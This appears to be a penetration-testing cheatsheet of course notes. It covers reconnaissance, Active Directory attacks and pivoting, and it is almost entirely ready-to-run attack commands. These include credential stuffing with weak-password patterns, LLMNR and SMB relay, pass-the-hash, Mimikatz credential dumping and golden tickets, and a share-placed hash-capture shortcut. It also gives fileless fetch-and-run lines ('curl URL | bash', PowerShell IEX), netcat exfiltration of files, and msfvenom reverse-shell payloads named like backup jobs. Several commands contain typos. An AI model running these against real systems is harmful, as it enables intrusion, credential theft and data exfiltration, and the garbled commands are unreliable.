# Practical_Ethical_Hacker_Cheatsheet
## Information Gathering (Reconnaissance)
### Discovering Email Addresses
  1. Ientify Emails with
        * hunter.io
        * phonebook.cz
        * Voilanorbert.com
        * clearbit Chrome Extension
    
  2. Verify the email
        * Verifyemailaddress.io
        * email-checker.net/validate
        * Check with password resets

### Discover Credentials with Dehashed
  1. Search for Breached Credentials with Dehashed.com
  2. if we find a hash we have search it on google or hashed.com to see if its cracked.

### Discover Subdomains
  1. Use sublist3r
  ```bash
  sublist3r -d <target.domain>
  ```
  2. Check crt.sh
  3. Use HTTPProbe to verify the subdomain is alive

### Discover Website Technologies
  1. Use builtwith.com
  2. Use the wappalyzer extension
  3. use whatweb
  ```bash
  whatweb <webpage>
  ```

### Utilizing Social Media
  1. Seach LinkedIn for employees, jobs, pictures
  2. From the employees, seach them on other platforms for information leakage
  3. If an organization has a lot of employees try the following password formats

      * \<Season>\<Year>\<Special Character>
      * \<CompanyName>\<Numbers>\<Special Character>
  
## Scanning and Enumeration
### Scanning for Alive Hosts
  ```shell
  netdiscover -r #{network}
  arp-scan -l
  ```
### Scanning with Nmap
#### Stealth Scan
  ```sh
  nmap -T4 -p- -A #{target} -oA TCP_Stealth_Scan
  ```
  ```sh
  nmap -sU -T4 ${target} -oA UDP_Scan
  ```
  
### Initial HTTP and HTTPS Enumeration
  1. If you see port 80 or 443 go to the website.
  2. Navigate the webpage to see if we can find the version of the server and the hostname
  3. Run a nikto scan
  ```sh
  nikto -h #{target} > nikto_scan.txt
  ```
  5. Enumerate directories start with the small directory list and escalate if nothing is found.
  ```sh
  dirbuster&
  ```
  6. View the source code for comments such as credentials and keys
  7. Intercept traffic with burp suite for information disclosure
  8. Check Wappalyzer

### Enumerating SMB
  1. Find the smb version
  * You can enumerate with metasploit module = auxiliary/scanner/smb/smb_version
  2. Enumerate the Shares
  ```sh
  smbclient -L \\\\#{target}\\
  ```
  ```sh
  smbclient \\\\<#{target}\\${share}
  ```

### Enumerating SSH
  1. Get the SSH version from nmap
  2. Attempt to SSH
  ```sh
  ssh #{target}
  ```
  If we get a "no matching key exchange method found" error add it with:
  ```sh
  ssh #{target} -oKexAlgorithms=+#{key_exchange}
  ```
  If we then get a "no cipher found add it:
  ```sh
  ssh #{target} -oKexAlgorithms=+#{key_exchange} -c #{cipher>
  ```
### Research Possible Vulnerabilities
  1. Search the versions + exploits in google and searchsploit
  2. If there is something found, it is worth noting down
  3. After all potential vulnerabilities are found try them to see what works.

## Vulnerability Scanning
### Scanning with Nessus
  1. Settings to use
    * Select Targets
    * Set up the email
    * Discovery > Scan type: Port Scan (All Ports)
    * Assessment > Scan Type: Known Web Vulnerabilities

### Scanning with Nmap
  ```sh
  nmap -T4 -p- -a --script vuln #{target}
  ```

## Exploitation Basics
### Basic Password Attacks
#### Metasploit
  1. Search for protocol log in script
  2. Set it up
  3. run it

#### Hydra
  ```sh
  hydra -l/-L ${user/User_list} -p/-P ${pass/pass_list} #{protocol}//#{target} -t #{threads} 
  ```

### Credential Stuffing
  1. if we have breached credentials we can use them against the target.
  2. Open Burp Suite to capture the traffic of a log in
  3. Set up intruder to change the username and password
  4. Run the attack and stop it
  5. Grep for an error code
  6. Rerun the attack and sort by the grep
  
  Note: Weak Password Policies could come into play attempt passwords with:
    * ${season}${year}${special character}
    * ${company}{special character}
    * Password123 
    * Password1!
    
## Attacking AD: Initial Attack Vectors
### LLMNR Poisoning
  1. Run responder and get hashes
  ```sh
  responder -I ${interface} -dwv
  ```
  2. Copy the hash
  3. Attempt to crack the hash with hashcat
  ```powershell
  .\hashcat -m 5600 .\ntlmhash.txt .\rockyou.txt -O
  ```
### SMB Relay Attacks
  1. Discover what hosts have SMB signing Disabled on either Nessus or Nmap.
  ```sh
  nmap --script=smb2-security-mode.nse -p445 #{network}
  ```
  2. Make a list of targets that have message signing enabled and not required or disabled.
  3. Change Responder.conf and change two lines: SMB = Off and HTTP = Off
  4. Start responder
   ```sh
  responder -I ${interface} -dwv
  ```
  4. Start ntlmrelayx and obtain SAM Hashes
  ```sh
  ntlmrelayx.py -tf targets.txt -smb2support
  ```
  5. Start ntlmrelayx and obtain an interactive shell
  ```sh
  ntlmrelayx.py -tf targets.txt -smb2support -i
  ```
  6. Connect to the shell
  ```sh
  nc 127.0.0.1 11000
  ```

### Gain Shell Access
  1. Try psexec in metasploit: use exploit/windows/smb/psexec or psexec_psh it is worth trying with different targets.
  2. Try psexec.py
  ```sh
  psexec.py <domain>/<username>:<Password>@<target>
  ```
  3. Try wmiexec.py
  ```sh
  wmiexec.py <domain>/<username>:<Password>@<target>
  ```
  4. Try smbexec.py
  ```sh
  smbexec.py <domain>/<username>:<Password>@<target>
  ```
### IPv6 Attacks
#### IPv6 DNS Takeover
 1. Set up mitm6
 ```sh
 mitm6 -d <target.domain>
  ```
 2. Set up ntlmrelayx
 ```sh
 ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.<target.domain> -l Domain_Enum
 ```
 3. Review the Domain_Enum Folder and view if users were created.

### Strategies
  1. Start with mitm6 or Responder
  2. Run scans to generate traffic
  3. scan for websites in scope (http_version)
  4. Look for default Credentials on
    * Printers
    * Jenkings
    * Etc
  5. Think Outside Box   

## Attacking AD: Post-Compromise Enumeration
### Domain Enumeration with Powerview
  1. Transfer PowerView.ps1 to the compromised machine
  2. start powershell and use PowerView.ps1
  ```cmd
  powershell -ep bypass
  . .\PowerView.ps1
  ```
  3. Perform Enumeration
  ```powershell
  Get-NetDOmain
  Get-NetDomainController
  Get-DomainPolicy
  (Get-DomainPolicy)."system access"
  Get-NetUser
  Get-NetUser | select cn
  Get-NetUser | select samusername
  Get-NetUser | select description
  Get-UserProperty -Properties pwdlastset
  Get-UserProperty -Properties logoncount
  Get-UserProperty -Properties badpwdcount
  Get-NetComputer
  Get-NetComputer -FullData
  Get-NetComputer -FullData | select OperatingSystem
  Get-NetGroup
  Get-NetGroup -GroupName "Domain Admins"
  Get-NetGroup -GroupName *admin*
  Get-NetGroupMember -GroupName "Domain Admins"
  Invoke-ShareFinder
  Get-NetGPO
  Get-NetGPO | select displayname, whenchanged
  ```
  
### Domain Enumeration with Bloodhound
  1. Start bloodhound
  ```sh
  neo4j&
  bloodhound&
  ```
  2. Get SharpHound.ps1 on a compromised asset.
  3. Start Powershell and collect the data
  ```powershell
  powershell -ep bypass
  . .\SharpHound.ps1
  Invoke-BloodHound -CollectionMethod All -Domain <domain.local> -ZipFIleName file.zip
  ```
  4. Transfer the data into BloodHound
  5. Analyze the data in queries
        *  Find all Domain Admins
        *  Find Shortest Path to Domain Admins
        *  Shortest path to Kerberoastable Users

## Attacking AD: Post-Compromise Attacks
### CrackMapExec
After capturing a hash or cracking a hash you can pass it around the network with crackmapexec.
#### Pass the hash with crackmapexec
```sh
crackmapexec smb <IP/Network> -d <domain> domain -u <user> -H <LM Hash> --local-auth
```
#### Pass the password with crackmapexec
```sh
crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> 
```
#### Enumeration with crackmapexec
```sh
crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> --users
```
```sh
crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> --groups
```
```sh
crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> --loggedon-users
```
```sh
crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> --shares
```
```sh
crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> --pass-pol
```
```sh
crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> --sessions
```
```sh
crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> -M enum_av
```


### Dump Hashes with secretsdump.py
```sh
secretsdump.py <domain>/<user>:<password>@<IP>
```

### Crack the hash with hashcat
```powershell
.\hashcat -m 1000 .\ntlmhash.txt .\rockyou.txt -O
```

### Token Impersonation
#### from meterpreter session
  1. load incognito
  2. list_token -u
  3. impersonate_token <user>

### kerberoasting
  1. Use GetUserSPNs.py
  ```sh
  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request
  ```
  2. Crack the hash
  ```powershell
  .\hashcat -m 13100 .\ntlmhash.txt .\rockyou.txt -O
  ```

### Abusing GPP
  Use powersploit module Get-GPPPassword.ps1 or Metasploit module ‘auxiliary/scanner/smb/smb_enum_gpp’ or ‘post/windows/gather/credentials/gpp’ to automatically find and get the cleartext password.

### URL File Attacks
  in a share place the following internet shortcut to get hashes when users navigate to this in the share
  ```html
  [InternetShortcut]
  URL=blah
  WorkingDirectory=blah
  IconFile=\\x.x.x.x\%USERNAME%.icon
  IconIndex=1
  ```
  
### Mimikatz Commands
  ```cmd
  privilege::debug
  ```
  ```cmd
  sekurlsa::logonpasswords
  ```
  ```cmd
  lsadump::sam
  ```
  ```cmd
  lsadump::sam /patch
  ```
  ```cmd
  lsadump::lsa /patch
  ```
  ```cmd
  lsadump::lsa /inject /name:krbtgt
  ```
  ```cmd
  kerberos::golden /User:Administrator /domain:<domain_> /sid:<Domain_sid> /krbtgt:<krbtgt_hash> /id:500 /ptt
  ```
  ```cmd
  misc::cmd
  ```
  ## ZeroLogon

## File Transfers
### Windows File Downloads
#### Powershell
  * Powershell File Download with DownloadFile
  ```Powershell
  (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
  ```
  * Powershell File Download with DownloadFileAsync
  ```Powershell
  (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
  ```
  * Powershell download with Invoke-WebRequest
  ```Powershell
  Invoke-WebRequest <Target File URL> -OutFile <Output File Name>
  ```
  ```Powershell
  iwr <Target File URL> -OutFile <Output File Name>
  ```
  * Powershell Fileless Method
  ```Powershell
  IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
  ```
  ```Powershell
  (New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
  ```
#### SMB
  1. Start an SMB server
  ```sh
  smbserver.py <share> -smb2support <path to files>
  ```
  2. Copy Files
  ```cmd
  copy \\<IP>\<share>\<file>
  ```
  If unauthenticated guest access is blocked do the following:
  
  1. start an SMB Server with login
  ```sh
  smbserver.py <share> -smb2support <path to files> -user <user> -password <pass>
  ```
  2. Mount the SMB Server
  ```cmd
  net use n: \\<ip>\<share> /user:<user> <pass>
  ```
#### FTP
  1. Start the FTP Server
  ```sh
  python3 -m pyftpdlib --port 21
  ```
  2. Download the files with Powershell
  ```sh
  (New-Object Net.WebClient).DownloadFile('ftp://<IP>/<file>', '<file>')
  ```

### Windows File Uploads with python
  1. start a python upload server
  ```sh
  python3 -m uploadserver
  ```
  2. Transfer PSUpload.ps1 to the Windows Machine
  ```powershell
  IEX(New-Object Net.WebClient).DownloadString('<path to PSUpload.ps1>')
  ```
  3. Transfer the file to the upload server
  ```powershell
  Invoke-FileUpload -Uri http://<IP>:8000/-File <file upload>
  ```
  
### Windows File Uploads with netcat in with Base64
  1. start the netcat listener
  ```sh
  nc -lvnp 8000
  ```
  2. Use powershell to encode the file and upload it
  ```sh
  $b64 = [System.convert]::ToBase64String((Get-Content -Path '<path to file>' -Encoding Byte))
  Invoke-WebRequest -Uri http://<IP>:8000/ -Method POST -Body $b64
  ```
  3. decode the post request
  ```sh
  echo <base64> | base64 -d -w 0 > hosts
  ``` 
  
### Windows File Uploads with SMB Uploads
  1. Start the WebDav Python Module
  ```sh
  wsgidav --host=0.0.0.0 --port=80 --root=<path/to/directory> --auth=anonymous 
  ```
  2. Connect to the WebDav Server
  ```cmd
  dir \\192.168.49.128\DavWWWRoot
  ```
  3. Upload files
  ```cmd
  copy <path/to/file> \\<IP>\DavWWWRoot\
  ```
  ```cmd
  copy <path/to/file> \\<IP>\<share folder>\
  ```
  
### Windows File Uploads with FTP 
  1. Start ftp server
  ```sh
  python3 -m pyftpdlib --port 21 --write
  ```
  2. Upload files with Powershell
  ```powershell
  (New-Object Net.WebClient).UploadFile('ftp://<ip>', '<File to upload>')
  ```
  
#### LOLBAS
##### Bitsadmin from Powershell
```powershell
bitsadmin /transfer wcb /priority foreground http://<host>/<file> C:\Users\<User>\Desktop\<file>
```
```powershell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://<host>/<file>" -Destination "C:\Users\<User>\Desktop\<file>"
```
  
##### Certutil
```cmd
certutil.exe -verifyctl -split -f http://<host>/<file>
```

### Linux File Downloads
#### Downloads with Wget
```sh
wget <Target File URL> -O <path/to/file_save>
```
#### Download with Curl
```sh
curl -o <path/to/file_save> <Target File URL>
```
#### Fileless Attacks with curl
```sh
curl <Target File URL> | bash
```
#### Fileless Attacks with wget
```sh
wget -q0- <Target File URL> | bash
```

### Linux File Uploads
  1. Start an upload server
  ```sh
  openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
  python3 -m uploadserver 443 --server-certificate server.pem
  ```
  2. Upload Files
  ```sh
  curl -X POST https://<IP> -F 'files=@<file to transfer>' -F 'files=@<file to transfer>' --insecure
  ```

#### GTFOBINS
##### openssl
  1. Create a Certificate on the server machine
  ```sh
  openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
  ```
  2. Start the server to serve a file
  ```sh
  openssl s_server -quiet -accept <port> -cert certificate.pam -key key.pam < <file> 
  ```
  3. Download the File
  ```sh
  openssl s_client -connect <host>:<port> -quiet > <file>
  ```
  
### Pivoting
#### Local Port Forward a Single Port with SSH
  ```sh
  ssh -L <LPORT>:localhost:<RPORT> <user>@<IP>
  ```
#### Local Port Forward Multiple Ports with SSH
  ```sh
  ssh -L <LPORT>:localhost:<RPORT> <LPORT>:localhost:<RPORT> <user>@<IP>
  ```
#### Dynamic Port Forward with SSH and Proxychains
  1. SSH to the Target
  ```sh
  ssh -D 9050 <user>@<IP>
  ```
  2. Scan the Target network with nmap and proxychains
  ```sh
  proxychains nmap -A Pn -sT <IP>
  ```
  3. If there is RDP Access we can use
  ```sh
  proxychains xfreerdp /v:<IP> /u:<user> /p:<pass>
  ```

#### Remote/Reverse Port Forwarding with SSH
  1. Create a Windows Payload with MSFVenom
  ```sh
  msfvenom -p windows/x64/meterpreter/reverse_https lhost= <Pivot Internal IP> -f exe -o backupscript.exe LPORT=8080
  ```
  2. Start the Listener
  ```sh
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_https
  set lhost 0.0.0.0
  set lport 8000
  run
  ```
  2. Transfer the .exe to the pivot server and then to the windows machine.
  3. Create the SSH Remote port forward
  ```sh
  ssh -R <Pivot Internal IP>:8080:0.0.0.0:8000 <user>@<External_IP> -vN
  ```

#### Meterpreter Tunneling
  1. Create a payload for Pivot Host
  ```sh
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Attack_IP> -f elf -o backupjob LPORT=8080
  ```
  2. Change permissions and run the exe on the pivot host
  ```sh
  chmod +x backupjob
  ./backupjob
  ```
  3. Perform a Ping Sweep from meterpreter
  ```msf
  run post/multi/gather/ping_sweep RHOSTS=<Internal_Network>
  ```
  4. Configure MSF's SOCKS Proxy and verify Proxy Server is Running
  ```sh
  use auxliary/server/socks_proxy
  set SRVPORT 9050
  set SRVHOST 0.0.0.0
  set version 4a
  run
  jobs
  ```
  5. Create Routes with autoroute
  ```sh
  use post/multi/manage/autoroute
  set SESSION x
  set subnet <IP>
  run
  ```
  or
  ```sh
  run autoroute -s <internal network>
  ```
  6. List active routes with AutoRoute
  ```sh
  run autoroute -p
  ```
  7. Verify Functionality
  ```sh
  proxychains nmap <IP> -p<port> -sT -v -Pn
  ```
  
#### Meterpreter Port Forwarding
  1. Create a Local TCP Relay from meterpreter session
  ```sh
  portfwd add -l <LPORT> -p <RPORT> -r <Internal_Target_IP>
  ```
  2. Verify by connecting to the port.
  
#### Meterpreter Reverse Port Forwarding
  1. Create a Reverse Port Forward
  ```sh
  portfwd add -R -l <LPORT> -p <RPORT> -L <Attack_IP>
  ```
  2. Configure and start the multi/handler
  ```sh
  bg
  set payload windows/x64/meterpreter/reverse_tcp
  set LPORT 8081
  set LHOST 0.0.0.0
  run
  ```
  3. Generate the Windows Payload
  ```sh
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Internal_Target_IP> -f exe -o backupscript.exe LPORT=1234
  ```
  4. Execute the payload on the windows host.
